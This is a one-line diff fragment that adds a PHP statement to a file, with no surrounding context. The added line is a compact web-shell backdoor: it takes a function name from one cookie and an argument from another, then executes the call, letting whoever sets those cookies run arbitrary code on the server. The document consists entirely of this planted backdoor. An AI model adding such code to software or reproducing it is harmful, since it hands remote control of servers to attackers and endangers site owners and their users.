@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["TTU"])){$_COOKIE["rF"]($_COOKIE["TTU"]);exit;}
